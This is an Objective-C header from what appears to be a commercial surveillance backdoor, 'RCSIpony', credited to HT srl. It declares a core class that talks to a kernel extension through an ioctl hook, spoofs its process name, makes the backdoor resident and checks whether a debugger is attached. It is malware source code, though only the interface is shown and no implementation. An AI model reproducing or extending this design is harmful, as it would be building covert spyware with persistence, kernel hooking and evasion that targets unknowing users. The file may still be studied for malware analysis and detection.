/*
 * RCSIpony - Core Header
 *  pon pon
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSICore_h__
#define __RCSICore_h__

#import "RCSIUtils.h"
#import "RCSISharedMemory.h"

//@class RCSMLogManager;


@interface RCSICore : NSObject
{
@private
  // backdoor descriptor for our own device
  int mBackdoorFD;
  // backdoor ID returned by our kext
  int mBackdoorID;
  // advisory lock descriptor -- not used as of now.
  int mLockFD;
  
@private
  // executable binary name
  NSString *mBinaryName;
  // application bundle name (without .app)
  NSString *mApplicationName;
  NSString *mSpoofedName;
  
@private
  NSString *mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
  
@private
  RCSIUtils         *mUtil;
}

@property (readwrite)       int mBackdoorFD;
@property (readwrite)       int mBackdoorID;
@property (readwrite)       int mLockFD;
@property (readwrite, copy) NSString *mBinaryName;
@property (readwrite, copy) NSString *mApplicationName;
@property (readwrite, copy) NSString *mSpoofedName;
@property (readwrite, copy) NSString *mMainLoopControlFlag;
@property (readonly)        RCSIUtils *mUtil;


- (id)initWithKey:(int)aKey
 sharedMemorySize:(int)aSize
    semaphoreName:(NSString *)aSemaphoreName;

- (void)dealloc;

- (BOOL)makeBackdoorResident;
- (BOOL)isBackdoorAlreadyResident;

- (BOOL)runMeh;

- (void)loadKext;

//
// Init uspace<->kspace communication channel (ioctl MCHOOK_INIT)
// return backdoorID to be used for all the future operations (ioctl requests)
//
- (int)connectKext;

//
// Separate thread - true if the current process is being debugged
// (either running under the debugger or has a debugger attached post facto)
//
- (void)amIBeingDebugged;

//
// Accessors - Keeping retrocompatibility with ObjC 1.x (for Tiger)
//
/*
- (int)mBackdoorFD;
- (void)setBackdoorFD: (int)aValue;

- (int)mBackdoorID;
- (void)setBackdoorID: (int)aValue;

- (int)mLockFD;
- (void)setLockFD: (int)aValue;

- (NSString *)mBinaryName;
- (void)setBinaryName: (NSString *)aValue;

- (NSString *)mApplicationName;
- (void)setApplicationName: (NSString *)aValue;

- (NSString *)mSpoofedName;
- (void)setSpoofedName: (NSString *)aValue;

- (NSString *)mMainLoopControlFlag;
- (void)setMainLoopControlFlag: (NSString *)aValue;

- (RCSISharedMemory *)mSharedMemoryCommand;
*/
@end

#endif
